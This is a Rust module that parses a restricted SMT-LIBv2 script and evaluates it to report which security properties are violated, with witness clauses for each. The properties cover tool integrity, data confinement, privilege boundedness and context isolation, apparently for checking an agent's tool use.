mod script_eval {
    use std::collections::BTreeMap;

    /// What the script decides, plus the witness clauses of each property.
    pub struct Outcome {
        /// False when some symbol is pinned to two different values.
        pub facts_consistent: bool,
        /// The verdict `sat`/`unsat` would report, as a boolean.
        pub any_property_violated: bool,
        /// Witness clauses per property define, as `(rendered clause, truth)`.
        pub properties: BTreeMap<String, Vec<(String, bool)>>,
        /// The conflicting pins, for the failure message.
        pub conflicts: Vec<String>,
    }

    #[derive(Debug, Clone, PartialEq)]
    enum Term {
        Atom(String),
        List(Vec<Term>),
    }

    #[derive(Debug, Clone, Copy, PartialEq)]
    enum Fact {
        Int(i64),
        Bool(bool),
    }

    #[derive(Debug, Clone, Copy, PartialEq)]
    enum Eval {
        Int(i64),
        Bool(bool),
    }

    struct Script {
        declared: BTreeMap<String, bool>,
        defines: BTreeMap<String, (Vec<String>, Term)>,
        facts: BTreeMap<String, Fact>,
        conflicts: Vec<String>,
    }

    /// Tokenises SMT-LIBv2: comments, parentheses, strings, symbols.
    fn tokenize(source: &str) -> Result<Vec<String>, String> {
        let mut tokens = Vec::new();
        let mut chars = source.chars().peekable();
        while let Some(&ch) = chars.peek() {
            if ch == ';' {
                for inner in chars.by_ref() {
                    if inner == '\n' {
                        break;
                    }
                }
            } else if ch == '(' || ch == ')' {
                tokens.push(ch.to_string());
                chars.next();
            } else if ch == '"' {
                let mut literal = String::from("\"");
                chars.next();
                loop {
                    match chars.next() {
                        Some('"') => break,
                        Some(inner) => literal.push(inner),
                        None => return Err("unterminated string literal".to_string()),
                    }
                }
                literal.push('"');
                tokens.push(literal);
            } else if ch.is_whitespace() {
                chars.next();
            } else if is_symbol_char(ch) {
                let mut symbol = String::new();
                while let Some(&inner) = chars.peek() {
                    if is_symbol_char(inner) {
                        symbol.push(inner);
                        chars.next();
                    } else {
                        break;
                    }
                }
                tokens.push(symbol);
            } else {
                return Err(format!("unsupported character {ch:?} in the emitted script"));
            }
        }
        Ok(tokens)
    }

    fn is_symbol_char(ch: char) -> bool {
        ch.is_ascii_alphanumeric() || "~!@$%^&*_-+=<>.?/:".contains(ch)
    }

    /// Parses the token stream into s-expressions.
    fn parse_terms(tokens: &[String]) -> Result<Vec<Term>, String> {
        let mut stack: Vec<Vec<Term>> = vec![Vec::new()];
        for token in tokens {
            match token.as_str() {
                "(" => stack.push(Vec::new()),
                ")" => {
                    let done = stack
                        .pop()
                        .ok_or_else(|| "unbalanced closing parenthesis".to_string())?;
                    stack
                        .last_mut()
                        .ok_or_else(|| "unbalanced closing parenthesis".to_string())?
                        .push(Term::List(done));
                }
                atom => stack
                    .last_mut()
                    .ok_or_else(|| "unbalanced closing parenthesis".to_string())?
                    .push(Term::Atom(atom.to_string())),
            }
        }
        if stack.len() != 1 {
            return Err("unbalanced opening parenthesis".to_string());
        }
        Ok(stack.pop().unwrap_or_default())
    }

    /// Renders a term back to SMT-LIB text, for witness identification.
    fn render(term: &Term) -> String {
        match term {
            Term::Atom(atom) => atom.clone(),
            Term::List(items) => {
                let inner: Vec<String> = items.iter().map(render).collect();
                format!("({})", inner.join(" "))
            }
        }
    }

    /// Reads the script's declarations, definitions and pinned facts.
    fn read_script(source: &str) -> Result<Script, String> {
        let terms = parse_terms(&tokenize(source)?)?;
        let mut script = Script {
            declared: BTreeMap::new(),
            defines: BTreeMap::new(),
            facts: BTreeMap::new(),
            conflicts: Vec::new(),
        };
        for term in &terms {
            let Term::List(items) = term else {
                return Err(format!("top-level atom {}", render(term)));
            };
            let Some(Term::Atom(head)) = items.first() else {
                return Err("empty top-level form".to_string());
            };
            match head.as_str() {
                "set-logic" | "set-info" | "check-sat" | "get-value" | "exit" => {}
                "declare-fun" => {
                    let (Some(Term::Atom(name)), Some(Term::List(params)), Some(Term::Atom(sort))) =
                        (items.get(1), items.get(2), items.get(3))
                    else {
                        return Err(format!("malformed declaration {}", render(term)));
                    };
                    if !params.is_empty() {
                        return Err(format!("declared function {name} takes arguments"));
                    }
                    if !matches!(sort.as_str(), "Int" | "Bool") {
                        return Err(format!("unsupported sort {sort}"));
                    }
                    if script.declared.insert(name.clone(), true).is_some() {
                        return Err(format!("symbol {name} declared twice"));
                    }
                }
                "define-fun" => {
                    let (Some(Term::Atom(name)), Some(Term::List(params)), Some(body)) =
                        (items.get(1), items.get(2), items.get(4))
                    else {
                        return Err(format!("malformed definition {}", render(term)));
                    };
                    let mut names = Vec::new();
                    for param in params {
                        let Term::List(binding) = param else {
                            return Err(format!("malformed parameter in {name}"));
                        };
                        let Some(Term::Atom(param_name)) = binding.first() else {
                            return Err(format!("malformed parameter in {name}"));
                        };
                        names.push(param_name.clone());
                    }
                    if script
                        .defines
                        .insert(name.clone(), (names, body.clone()))
                        .is_some()
                    {
                        return Err(format!("operator {name} defined twice"));
                    }
                }
                "assert" => {
                    let Some(expr) = items.get(1) else {
                        return Err("assert without an expression".to_string());
                    };
                    pin(expr, &mut script)?;
                }
                other => return Err(format!("unsupported top-level form {other}")),
            }
        }
        Ok(script)
    }

    /// Records one ground fact, or reports a contradiction.
    fn pin(expr: &Term, script: &mut Script) -> Result<(), String> {
        let pinned = match expr {
            Term::Atom(name) => Some((name.clone(), Fact::Bool(true))),
            Term::List(items) if items.len() == 2 => match (&items[0], &items[1]) {
                (Term::Atom(head), Term::Atom(name)) if head == "not" => {
                    Some((name.clone(), Fact::Bool(false)))
                }
                _ => None,
            },
            Term::List(items) if items.len() == 3 => match (&items[0], &items[1], &items[2]) {
                (Term::Atom(head), Term::Atom(name), Term::Atom(value)) if head == "=" => value
                    .parse::<i64>()
                    .ok()
                    .map(|parsed| (name.clone(), Fact::Int(parsed))),
                (Term::Atom(head), Term::Atom(value), Term::Atom(name)) if head == "=" => value
                    .parse::<i64>()
                    .ok()
                    .map(|parsed| (name.clone(), Fact::Int(parsed))),
                _ => None,
            },
            _ => None,
        };
        let Some((name, value)) = pinned else {
            return Err(format!(
                "assert outside the pinned-fact fragment: {}",
                render(expr)
            ));
        };
        if !script.declared.contains_key(&name) {
            return Err(format!("assert pins undeclared symbol {name}"));
        }
        match script.facts.get(&name) {
            None => {
                script.facts.insert(name, value);
            }
            Some(existing) if *existing == value => {}
            Some(existing) => script
                .conflicts
                .push(format!("{name} pinned to both {existing:?} and {value:?}")),
        }
        Ok(())
    }

    /// Evaluates a ground term under the pinned facts.
    fn eval(
        term: &Term,
        environment: &BTreeMap<String, Eval>,
        script: &Script,
    ) -> Result<Eval, String> {
        match term {
            Term::Atom(name) => {
                if let Some(value) = environment.get(name) {
                    return Ok(*value);
                }
                if let Some(fact) = script.facts.get(name) {
                    return Ok(match fact {
                        Fact::Int(value) => Eval::Int(*value),
                        Fact::Bool(value) => Eval::Bool(*value),
                    });
                }
                if let Some((params, body)) = script.defines.get(name) {
                    if params.is_empty() {
                        return eval(body, environment, script);
                    }
                    return Err(format!("operator {name} used without arguments"));
                }
                match name.as_str() {
                    "true" => Ok(Eval::Bool(true)),
                    "false" => Ok(Eval::Bool(false)),
                    other => {
                        if let Ok(parsed) = other.parse::<i64>() {
                            Ok(Eval::Int(parsed))
                        } else if script.declared.contains_key(other) {
                            Err(format!("symbol {other} is declared but never pinned"))
                        } else {
                            Err(format!("unresolved symbol {other}"))
                        }
                    }
                }
            }
            Term::List(items) => {
                let Some(Term::Atom(head)) = items.first() else {
                    return Err(format!("malformed term {}", render(term)));
                };
                let args = &items[1..];
                match head.as_str() {
                    "and" => {
                        if args.is_empty() {
                            return Err("(and) with no arguments is not SMT-LIB".to_string());
                        }
                        let mut result = true;
                        for arg in args {
                            result &= boolean(eval(arg, environment, script)?)?;
                        }
                        Ok(Eval::Bool(result))
                    }
                    "or" => {
                        if args.is_empty() {
                            return Err("(or) with no arguments is not SMT-LIB".to_string());
                        }
                        let mut result = false;
                        for arg in args {
                            result |= boolean(eval(arg, environment, script)?)?;
                        }
                        Ok(Eval::Bool(result))
                    }
                    "not" => {
                        let [arg] = args else {
                            return Err("(not) takes exactly one argument".to_string());
                        };
                        Ok(Eval::Bool(!boolean(eval(arg, environment, script)?)?))
                    }
                    "=" => {
                        let [left, right] = args else {
                            return Err("(=) takes exactly two arguments".to_string());
                        };
                        let left = eval(left, environment, script)?;
                        let right = eval(right, environment, script)?;
                        Ok(Eval::Bool(left == right))
                    }
                    "<=" | "<" | ">" | ">=" => {
                        let [left, right] = args else {
                            return Err(format!("({head}) takes exactly two arguments"));
                        };
                        let left = integer(eval(left, environment, script)?)?;
                        let right = integer(eval(right, environment, script)?)?;
                        let result = match head.as_str() {
                            "<=" => left <= right,
                            "<" => left < right,
                            ">" => left > right,
                            _ => left >= right,
                        };
                        Ok(Eval::Bool(result))
                    }
                    "ite" => {
                        let [condition, then_value, else_value] = args else {
                            return Err("(ite) takes exactly three arguments".to_string());
                        };
                        if boolean(eval(condition, environment, script)?)? {
                            eval(then_value, environment, script)
                        } else {
                            eval(else_value, environment, script)
                        }
                    }
                    other => {
                        let Some((params, body)) = script.defines.get(other) else {
                            return Err(format!("unresolved operator {other}"));
                        };
                        if args.len() != params.len() {
                            return Err(format!(
                                "operator {other} expects {} arguments, got {}",
                                params.len(),
                                args.len()
                            ));
                        }
                        let mut child = environment.clone();
                        for (param, arg) in params.iter().zip(args) {
                            child.insert(param.clone(), eval(arg, environment, script)?);
                        }
                        eval(body, &child, script)
                    }
                }
            }
        }
    }

    fn boolean(value: Eval) -> Result<bool, String> {
        match value {
            Eval::Bool(flag) => Ok(flag),
            Eval::Int(integer) => Err(format!("expected a boolean, found {integer}")),
        }
    }

    fn integer(value: Eval) -> Result<i64, String> {
        match value {
            Eval::Int(integer) => Ok(integer),
            Eval::Bool(flag) => Err(format!("expected an integer, found {flag}")),
        }
    }

    /// Decides the emitted script.
    pub fn evaluate_script(source: &str) -> Result<Outcome, String> {
        let script = read_script(source)?;
        let mut properties: BTreeMap<String, Vec<(String, bool)>> = BTreeMap::new();
        if !script.conflicts.is_empty() {
            return Ok(Outcome {
                facts_consistent: false,
                any_property_violated: false,
                properties,
                conflicts: script.conflicts,
            });
        }
        let environment: BTreeMap<String, Eval> = BTreeMap::new();
        for name in [
            "tool_integrity_violated",
            "data_confinement_violated",
            "privilege_boundedness_violated",
            "context_isolation_violated",
        ] {
            let (_, body) = script
                .defines
                .get(name)
                .ok_or_else(|| format!("the script must define {name}"))?;
            let mut clauses = Vec::new();
            match body {
                Term::Atom(atom) if atom == "false" => {}
                Term::List(items)
                    if matches!(items.first(), Some(Term::Atom(head)) if head == "or") =>
                {
                    if items.len() < 2 {
                        return Err(format!("{name} has an empty disjunction"));
                    }
                    for clause in &items[1..] {
                        let truth = boolean(eval(clause, &environment, &script)?)?;
                        clauses.push((render(clause), truth));
                    }
                }
                other => {
                    let truth = boolean(eval(other, &environment, &script)?)?;
                    clauses.push((render(other), truth));
                }
            }
            properties.insert(name.to_string(), clauses);
        }
        let (_, any_body) = script
            .defines
            .get("any_property_violated")
            .ok_or_else(|| "the script must define any_property_violated".to_string())?;
        let any_property_violated = boolean(eval(any_body, &environment, &script)?)?;
        let from_parts = properties
            .values()
            .any(|clauses| clauses.iter().any(|(_, truth)| *truth));
        if any_property_violated != from_parts {
            return Err(format!(
                "any_property_violated ({any_property_violated}) disagrees with its parts ({from_parts})"
            ));
        }
        Ok(Outcome {
            facts_consistent: true,
            any_property_violated,
            properties,
            conflicts: Vec::new(),
        })
    }
}
